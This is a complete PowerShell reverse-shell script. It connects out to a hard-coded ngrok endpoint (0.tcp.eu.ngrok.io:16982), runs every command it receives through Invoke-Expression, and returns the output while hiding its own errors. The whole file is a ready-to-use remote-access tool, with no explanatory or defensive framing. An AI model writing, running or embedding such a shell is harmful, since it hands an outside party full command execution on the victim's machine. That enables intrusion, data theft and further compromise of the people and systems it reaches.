# Reverse PowerShell shell (simple)
# Connects back to ngrok endpoint 0.tcp.eu.ngrok.io:16982
$server = "0.tcp.eu.ngrok.io"
$port = 16982
try {
    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $encoding = New-Object System.Text.ASCIIEncoding

    $buffer = New-Object byte[] 1024
    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = $encoding.GetString($buffer, 0, $bytesRead)
        try {
            $output = (Invoke-Expression $data 2>&1 | Out-String )
        } catch {
            $output = $_.Exception.Message + " `n"
        }
        $prompt = "PS " + (Get-Location).Path + "> "
        $response = $output + $prompt
        $responseBytes = $encoding.GetBytes($response)
        $stream.Write($responseBytes, 0, $responseBytes.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    # suppress errors
}
